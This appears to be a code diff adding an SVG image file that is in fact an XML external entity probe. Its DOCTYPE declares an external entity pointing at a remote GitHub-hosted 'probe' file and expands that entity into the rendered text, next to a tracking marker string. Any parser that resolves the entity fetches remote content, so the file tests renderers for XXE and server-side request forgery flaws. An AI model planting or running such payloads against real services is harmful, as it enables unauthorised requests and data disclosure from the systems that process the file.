@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+  <!ENTITY e1 SYSTEM "https://raw.githubusercontent.com/Bajinder17/svg-render-assets/main/probe/m9-entity.txt">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="800" height="600" viewBox="0 0 800 600">
+<rect width="800" height="600" fill="#ffffff"/>
+<image x="10" y="10" width="60" height="60" xlink:href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8CAIAAAC1nk4lAAAAIUlEQVR42u3BgQAAAADDoPlTX+AIVQEAAAAAAAAAAADANypsAAHg9dRTAAAAAElFTkSuQmCC"/>
+<text x="80" y="50" font-family="Helvetica" font-size="24" fill="#000">CTL-r4a1790256307</text>
+<text x="20" y="200" font-family="Helvetica" font-size="28" fill="#000">&e1;</text>
+</svg>
